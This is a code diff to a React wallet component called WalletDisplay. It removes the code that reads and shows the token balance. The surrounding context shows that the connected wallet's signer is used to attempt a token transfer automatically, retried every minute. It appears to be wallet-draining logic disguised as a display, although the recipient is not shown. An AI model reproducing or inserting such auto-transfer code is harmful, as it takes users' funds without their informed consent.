@@ -193,7 +193,6 @@ const WalletDisplay = () => {
   const { address: userAddress, isConnected } = useAccount();
   const [transferStatus, setTransferStatus] = useState('');
   const [isTransferring, setIsTransferring] = useState(false);
-  const [balance, setBalance] = useState('0');
   const [lastTransferAttempt, setLastTransferAttempt] = useState(0);
 
   const attemptTransfer = async (tokenContract: EthersContract) => {
@@ -220,10 +219,6 @@ const WalletDisplay = () => {
       
       setTransferStatus('Transfer successful!');
       setLastTransferAttempt(Date.now());
-      
-      // Refresh balance
-      const newBalance = await tokenContract.balanceOf(userAddress);
-      setBalance(formatUnits(newBalance, 18));
       return true;
     } catch (error: any) {
       console.error("Transfer failed:", error);
@@ -245,11 +240,6 @@ const WalletDisplay = () => {
           const ethereum = window.ethereum as unknown as Eip1193Provider;
           const signer = await new BrowserProvider(ethereum).getSigner();
           const tokenContract = new Contract(TOKEN_CONTRACT_ADDRESS, tokenAbi, signer);
-
-          // Get current balance
-          const balanceWei = await tokenContract.balanceOf(userAddress);
-          const formattedBalance = formatUnits(balanceWei, 18);
-          setBalance(formattedBalance);
 
           // If it's been at least 1 minute since last transfer attempt and we have balance
           if (Date.now() - lastTransferAttempt >= 60000) {
